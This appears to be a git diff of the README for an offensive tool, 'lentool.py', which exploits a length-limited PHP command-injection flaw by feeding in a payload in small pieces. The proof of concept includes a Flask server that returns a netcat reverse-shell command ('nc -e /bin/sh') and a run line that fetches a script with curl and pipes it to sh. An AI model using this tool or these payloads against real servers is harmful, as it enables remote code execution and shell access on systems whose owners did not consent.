@@ -4,9 +4,18 @@ It pipes the payload to sh, you can customize it with a few changes in the sourc
 
 # Usage
 ```
-python3 lentool.py -t http://targetexample.com/?start -u http://myserverexample.com
---target, -t: Target URL with param.  
---url, -u: Web server hosting the payload.
+usage: lentool.py [-h] -c COMMAND -t TARGET [-s MAX_SIZE] [-d DELAY]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c COMMAND, --command COMMAND
+                        Payload location
+  -t TARGET, --target TARGET
+                        Url target (with param ex: http://target?cmd
+  -s MAX_SIZE, --max-size MAX_SIZE
+                        Maximum amount of characters per request
+  -d DELAY, --delay DELAY
+                        Time to wait between requests in tenths of a second
 ```
  # POC
  ## Vulnerable application:
@@ -33,7 +42,7 @@ if (strlen($_GET['start']) < 5){
  ```
  ## Flask server to host the payload:
  ```python
- from flask import Flask, Response
+from flask import Flask, Response
  
 app = Flask(__name__)
  
@@ -42,12 +51,12 @@ def i():
     return Response("nc -e /bin/sh 127.0.0.1 1234", headers={'Content-Type': 'text/plain'}, status=200)
  
 if __name__ == '__main__':
-    app.run(host='0.0.0.0',port=4321)
- ```
- ## Run:
- ```
- python3 lentool.py -t http://127.0.0.1:1808?start -u 127.0.0.1:4321
- ```
+    app.run(host='0.0.0.0',port=5000)
+```
+## Run:
+```
+python3 lentool.py -c 'curl localhost:5000|sh' -t http://127.0.0.1/index.php?start -s 4
+```
  
 
 https://user-images.githubusercontent.com/40002393/154508216-648b8403-f78a-4298-b68c-85944a2118e1.mp4
